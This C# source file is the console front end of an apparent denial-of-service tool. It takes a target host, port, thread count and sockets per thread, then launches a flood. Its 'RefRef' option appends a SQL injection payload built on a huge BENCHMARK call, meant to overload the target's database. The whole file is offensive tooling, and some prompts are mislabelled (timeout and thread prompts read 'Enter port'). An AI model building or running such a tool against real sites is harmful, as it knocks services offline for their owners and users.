using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
namespace GAS.CLI
{
    class Program
    {
        GAS.Core.Manager Core = new GAS.Core.Manager();
        void Main(string[] args)
        {
            while (true)
            {
                Console.WriteLine("Select target");
                string temp = Console.ReadLine();
                bool IPOK = Core.LockOn(temp);
                if (!IPOK)
                    break;
                Console.WriteLine("Subsite is {0}, do you want to change it?[y/n]", Core.Subsite);
                if (Console.ReadLine().ToLower()[0] == 'y')
                    Core.Subsite = Console.ReadLine();
                temp = Console.ReadLine();
                if (temp != "RefRef")
                    Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), temp);
                else
                {
                    Core.Method = GAS.Core.AttackMethod.HTTP;
                    Core.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
                }
                Console.WriteLine("Enter port[80]");
                Core.Port = int.Parse(Console.ReadLine());
                Console.WriteLine("Enter port[30]");
                Core.Timeout = int.Parse(Console.ReadLine());
                Console.WriteLine("Enter port[10]");
                Core.Threads = int.Parse(Console.ReadLine());
                Console.WriteLine("Enter sockets per thread[50]");
                Core.SPT = int.Parse(Console.ReadLine());
                Console.WriteLine("USE Get");
                Core.USEGet = bool.Parse(Console.ReadLine());
                Console.WriteLine("USE GZIP");
                Core.UseGZIP = bool.Parse(Console.ReadLine());
                Console.WriteLine("Enter delay[0]");
                Core.Delay = int.Parse(Console.ReadLine());
                Console.WriteLine("Wait    For Response ");
                Core.WaitForResponse = bool.Parse(Console.ReadLine());
                Console.WriteLine("Append RANDOMC hars ");
                Core.AppendRANDOMChars = bool.Parse(Console.ReadLine());
                Console.WriteLine("Append RANDOM Chars 2 Url ");
                Core.AppendRANDOMCharsUrl = bool.Parse(Console.ReadLine());
                Core.Start();
            }
        }
    }
}
